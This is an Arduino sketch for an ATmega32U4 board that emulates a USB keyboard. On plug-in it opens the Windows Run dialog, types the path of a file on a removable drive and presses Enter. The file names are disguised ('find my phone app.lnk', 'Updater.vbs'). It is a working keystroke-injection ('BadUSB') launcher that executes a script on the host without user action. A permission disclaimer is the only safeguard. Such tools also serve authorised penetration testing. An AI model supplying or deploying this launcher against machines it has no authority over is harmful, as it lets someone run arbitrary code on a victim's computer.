#include <Keyboard.h>

/*
  open_vbs_via_run.ino
  Target: Arduino Micro / Pro Micro / any ATmega32U4-based board
  Purpose: Open the Windows Run dialog (Win+R), type a path to a .vbs file and press Enter.
  Notes:
    - Use only on machines you own or have explicit permission to test.
*/
void setup() {
  // Start HID keyboard emulation
  Keyboard.begin();
  delay(1000); // allow host to detect/allow HID device

  // Open Run dialog (Win + R)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50);
  Keyboard.releaseAll();
  delay(250); // Wait for the Run dialog to open

  // Type the path to the VBS file.
  // Use either forward slashes or escaped backslashes. Both generally work for Run.
  Keyboard.print("E:\\find my phone app.lnk"); // or "D:\\Updater.vbs"
  delay(80);

  // Press Enter to execute the typed path
  Keyboard.write(KEY_RETURN);
  delay(1000); // wait for the file/association to start

  // Optional: stop keyboard emulation if you don't need further keystrokes
  Keyboard.end();
}

void loop() {
  // nothing to do
}
